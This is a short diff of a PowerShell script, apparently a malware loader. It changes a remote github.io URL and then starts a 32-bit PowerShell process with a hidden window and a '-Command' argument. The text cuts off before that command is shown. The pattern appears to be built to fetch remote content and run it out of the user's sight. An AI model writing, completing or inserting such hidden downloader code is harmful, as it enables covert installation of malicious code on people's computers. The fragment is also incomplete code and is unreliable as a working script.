@@ -1,4 +1,4 @@
-$url = "https://stinkylick.github.io/stinkylick/hi"
+$url = "https://stinkylick.github.io/stinkylick/2/a"
 if ([Environment]::Is64BitProcess) {
     Start-Process -FilePath "$env:WINDIR\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" `
         -ArgumentList "-WindowStyle Hidden -Command 
